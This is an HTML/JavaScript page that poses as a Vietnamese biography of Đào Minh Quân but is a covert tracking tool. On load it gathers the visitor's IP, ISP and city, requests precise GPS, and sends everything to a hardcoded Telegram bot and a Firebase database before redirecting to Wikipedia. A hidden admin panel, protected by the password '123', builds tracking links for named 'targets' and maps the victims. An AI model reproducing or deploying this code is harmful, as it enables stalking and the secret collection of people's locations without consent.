<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Ti·ªÉu s·ª≠ ƒê√†o Minh Qu√¢n</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
</head>
<body class="bg-[#0b0e14] text-slate-400 font-sans">

    <div id="v-track" class="flex flex-col items-center justify-center h-screen bg-white">
        <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
        <p class="mt-4 text-gray-500 text-sm italic">ƒêang t·∫£i n·ªôi dung...</p>
    </div>

    <div id="v-admin" class="hidden min-h-screen p-4 md:p-8">
        <div class="max-w-6xl mx-auto">
            <header class="flex justify-between items-center mb-8 border-b border-slate-800 pb-4">
                <h1 class="text-2xl font-black italic text-white uppercase tracking-tighter">SENTINEL <span class="text-blue-500">X</span></h1>
                <button onclick="logout()" class="text-[10px] bg-red-500/10 text-red-500 px-3 py-1 rounded-lg">ƒêƒÉng xu·∫•t</button>
            </header>

            <div class="grid lg:grid-cols-3 gap-6">
                <div class="space-y-6">
                    <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 shadow-2xl">
                        <h3 class="text-blue-500 font-bold text-[10px] uppercase mb-4 tracking-widest italic">C·∫•u h√¨nh nhanh</h3>
                        <div class="space-y-3">
                            <input id="in-tk" type="text" placeholder="Bot Token" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
                            <input id="in-id" type="text" placeholder="Chat ID" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
                            <button onclick="saveC()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all">L∆ØU C·∫§U H√åNH</button>
                        </div>
                    </div>
                    
                    <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800">
                        <h3 class="text-yellow-500 font-bold text-[10px] uppercase mb-4 tracking-widest italic">T·∫°o link m·ªõi</h3>
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u..." class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs mb-3 outline-none">
                        <div id="out-link" onclick="copyL()" class="bg-black p-4 rounded-xl text-blue-500 text-[10px] break-all border border-slate-900 cursor-pointer hidden"></div>
                    </div>
                </div>

                <div class="lg:col-span-2 space-y-6">
                    <div id="map" class="h-64 bg-slate-800 rounded-3xl border border-slate-700 z-0 overflow-hidden shadow-2xl"></div>
                    <div class="bg-[#161b22] rounded-3xl border border-slate-800 overflow-hidden shadow-2xl">
                        <table class="w-full text-left text-[11px]">
                            <thead class="bg-slate-900 text-slate-500 uppercase text-[9px]">
                                <tr><th class="p-4">M·ª•c ti√™u</th><th class="p-4">IP / ISP</th><th class="p-4 text-right">Tr·∫°ng th√°i</th></tr>
                            </thead>
                            <tbody id="t-logs" class="divide-y divide-slate-800"></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // === S·ª¨A LINK FIREBASE C·ª¶A B·∫†N T·∫†I ƒê√ÇY ===
        const firebaseConfig = { databaseURL: "https://9000-firebase-check2-1770334468923.cluster-mwsteha33jfdowtvzffztbjcj6.cloudworkstations.dev" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let cfg = { t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144", i: "5887642221", r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n" };
        const params = new URLSearchParams(window.location.search);
        let map, markers = [];

        window.onload = async () => {
            if (params.has('admin')) {
                if (localStorage.getItem('sentinel_auth') === 'true' || prompt("Nh·∫≠p Pass:") === "123") {
                    localStorage.setItem('sentinel_auth', 'true');
                    document.getElementById('v-track').classList.add('hidden');
                    document.getElementById('v-admin').classList.remove('hidden');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startTrack(); }
        };

        // H√†m l·∫•y IP c·∫£i ti·∫øn - c√≥ nhi·ªÅu d·ªãch v·ª• d·ª± ph√≤ng
        async function getIP() {
            const services = [
                // D·ªãch v·ª• 1: ipapi.co (nhanh, ƒë·∫ßy ƒë·ªß th√¥ng tin)
                async () => {
                    const res = await fetch('https://ipapi.co/json/', {timeout: 5000}).then(r => r.json());
                    if (res.ip) return { ip: res.ip, org: res.org, city: res.city, country: res.country_name, latitude: res.latitude, longitude: res.longitude };
                },
                // D·ªãch v·ª• 2: ip-api.com (mi·ªÖn ph√≠, ch√≠nh x√°c)
                async () => {
                    const res = await fetch('http://ip-api.com/json/?fields=query,org,city,country,lat,lon', {timeout: 5000}).then(r => r.json());
                    if (res.query) return { ip: res.query, org: res.org, city: res.city, country: res.country, latitude: res.lat, longitude: res.lon };
                },
                // D·ªãch v·ª• 3: ipify (c∆° b·∫£n nh∆∞ng r·∫•t ·ªïn ƒë·ªãnh)
                async () => {
                    const ip = await fetch('https://api.ipify.org?format=json', {timeout: 5000}).then(r => r.json()).then(d => d.ip);
                    if (ip) return { ip: ip, org: 'Unknown', city: 'Unknown', country: 'Unknown' };
                },
                // D·ªãch v·ª• 4: extreme-ip-lookup
                async () => {
                    const res = await fetch('https://extreme-ip-lookup.com/json/', {timeout: 5000}).then(r => r.json());
                    if (res.query) return { ip: res.query, org: res.businessName, city: res.city, country: res.country, latitude: res.lat, longitude: res.lon };
                },
                // D·ªãch v·ª• 5: Fallback ƒë∆°n gi·∫£n
                async () => {
                    return { ip: 'N/A', org: 'Unable to fetch', city: 'Unknown', country: 'Unknown' };
                }
            ];

            for (let service of services) {
                try {
                    const result = await Promise.race([
                        service(),
                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 6000))
                    ]);
                    if (result && result.ip && result.ip !== 'N/A') {
                        return result;
                    }
                } catch (e) {
                    console.log('IP service failed, trying next...', e.message);
                    continue;
                }
            }
            return { ip: 'Unknown', org: 'All services failed', city: 'Unknown', country: 'Unknown' };
        }

        async function startTrack() {
            const v = params.get('v');
            try { if(v) cfg = JSON.parse(atob(v)); } catch(e) {}

            const ipRes = await getIP();
            const logData = {
                name: params.get('name') || '·∫®n danh',
                ip: ipRes.ip || 'Blocked',
                isp: ipRes.org || 'Unknown',
                loc: (ipRes.city && ipRes.country) ? `${ipRes.city}, ${ipRes.country}` : 'Unknown',
                time: new Date().toLocaleString(),
                lat: ipRes.latitude || null,
                lon: ipRes.longitude || null,
                st: 'IP-Captured'
            };

            const report = (m) => fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(m)}`);
            await report(`üöÄ <b>TRUY C·∫¨P: ${logData.name}</b>\nüåê IP: <code>${logData.ip}</code>\nüè¢ ISP: ${logData.isp}\nüìç V√πng: ${logData.loc}`);

            const logRef = db.ref('logs').push(logData);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    await logRef.update({ lat, lon, st: 'GPS-OK' });
                    await report(`üéØ <b>GPS OK: ${logData.name}</b>\nüìç <a href="http://maps.google.com/q=${lat},${lon}">XEM B·∫¢N ƒê·ªí</a>`);
                    location.replace(cfg.r);
                }, async () => {
                    await report(`‚ö†Ô∏è <b>T·ª™ CH·ªêI GPS: ${logData.name}</b>\nüìç Ch·ªâ l·∫•y ƒë∆∞·ª£c IP.`);
                    location.replace(cfg.r);
                }, {enableHighAccuracy:true, timeout:6000});
            } else { location.replace(cfg.r); }
            setTimeout(() => location.replace(cfg.r), 8000);
        }

        function initAdmin() {
            map = L.map('map').setView([15.8, 108.2], 5);
            L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(map);

            const saved = localStorage.getItem('cfg_v12');
            if(saved) cfg = JSON.parse(saved);
            document.getElementById('in-tk').value = cfg.t;
            document.getElementById('in-id').value = cfg.i;

            db.ref('logs').on('value', snap => {
                const data = snap.val();
                const table = document.getElementById('t-logs');
                table.innerHTML = "";
                markers.forEach(m => map.removeLayer(m));
                for(let id in data) {
                    const item = data[id];
                    if(item.lat) {
                        const m = L.marker([item.lat, item.lon]).addTo(map).bindPopup(item.name);
                        markers.push(m);
                    }
                    table.innerHTML = `
                        <tr class="hover:bg-slate-800/40 border-b border-slate-800">
                            <td class="p-4 font-bold text-white">${item.name}<br><span class="text-[9px] font-normal text-slate-500">${item.time}</span></td>
                            <td class="p-4 text-blue-400 font-mono text-[10px]">${item.ip}<br><span class="text-slate-500 text-[9px] uppercase">${item.isp}</span></td>
                            <td class="p-4 text-right">
                                <span class="${item.st==='GPS-OK'?'text-green-500':'text-yellow-600'} font-bold uppercase text-[9px]">${item.st}</span><br>
                                <button onclick="map.flyTo([${item.lat},${item.lon}], 16)" class="text-blue-500 text-[10px] underline">Ghim</button>
                            </td>
                        </tr>` + table.innerHTML;
                }
            });
        }

        function saveC() {
            cfg.t = document.getElementById('in-tk').value;
            cfg.i = document.getElementById('in-id').value;
            localStorage.setItem('cfg_v12', JSON.stringify(cfg));
            alert("ƒê√£ l∆∞u c·∫•u h√¨nh th√†nh c√¥ng!");
        }

        function copyL() {
            navigator.clipboard.writeText(document.getElementById('out-link').innerText);
            alert("ƒê√£ copy link!");
        }

        document.getElementById('in-name').oninput = function() {
            const base = window.location.href.split('?')[0];
            const data = btoa(JSON.stringify(cfg));
            document.getElementById('out-link').classList.remove('hidden');
            document.getElementById('out-link').innerText = `${base}?name=${encodeURIComponent(this.value)}&v=${data}`;
        }
        function logout() { localStorage.removeItem('sentinel_auth'); location.reload(); }
    </script>
</body>
</html>
